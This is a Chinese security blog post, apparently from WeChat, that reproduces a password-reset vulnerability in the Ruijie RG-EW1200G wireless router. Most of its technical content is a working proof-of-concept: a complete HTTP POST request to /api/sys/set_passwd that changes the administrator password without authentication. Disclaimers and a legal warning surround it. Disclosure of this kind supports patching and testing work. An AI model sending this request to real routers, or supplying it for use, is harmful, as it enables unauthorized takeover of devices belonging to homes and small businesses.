> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0MjU5NTY2MQ==&mid=2247484416&idx=1&sn=d4ca2b0c863b7ac03f1c479a4455648d

#  【漏洞复现】锐捷 RG-EW120路由器存在密码重置漏洞  
什么安全  什么安全   2025-07-08 06:33  
  
   
 请勿利用  
文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接  
或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责  
！    
## 产品描述  
  
锐捷网络  
RG-EW1200G是一款有线无线全千兆  
双频无线路由器  
，适合平层家居、别墅、小型店铺、SOHO办公等场景使用。  
## 漏洞描述  
  
  
系统  
/api/sys/set_passwd存在逻辑缺陷，远程攻击者可通过该接口任意修改管理员密码实现系统登录。  
## Poc  
  

```
POST /api/sys/set_passwd HTTP/1.1
Host: 
Content-Length: 42
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140
Content-Type: application/json;charset=UTF-8
Origin: 
Referer: 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close


{&#34;username&#34;:&#34;web&#34;,&#34;admin_new&#34;:&#34;xxxxx&#34;}
```

  
##   
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/w0DeFbFI15w2WtvYFbw9eFYu5sibOVaEMkRQsaiaqrXnppI2ECGCzcniawXGnDLib2TdF70BHFG7PKGuF84ZLIKia7g/640?wx_fmt=png&from=appmsg "")  
  
  
小  
知  
识  
  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声  
明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
  
